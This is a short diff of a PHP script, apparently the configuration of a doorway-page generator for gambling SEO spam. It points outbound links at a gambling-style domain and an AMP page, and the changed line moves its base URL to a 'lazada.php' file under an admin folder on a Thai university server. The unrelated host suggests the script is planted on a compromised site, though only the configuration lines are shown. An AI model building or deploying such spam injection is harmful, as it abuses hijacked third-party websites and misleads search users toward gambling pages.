@@ -3,7 +3,7 @@
 $params = file("param.txt", FILE_IGNORE_NEW_LINES); 
 $linkout = 'https://ggy88.ltd/';
 $amphtmlurl = 'https://pub-2b854fc2d87a44d6b67e4ab4637366b7.r2.dev/ggy88/ggy88.html';
-$domain = 'https://xn--42c2b7ac4iwc.com/views/lazada.php?play='; // kalau apache jangan lupa tanda '/' di ujung
+$domain = 'http://app.csit.sci.tsu.ac.th/admins/lazada.php?play='; // kalau apache jangan lupa tanda '/' di ujung
 $keyword = file('hajar.txt', FILE_IGNORE_NEW_LINES);
 
 
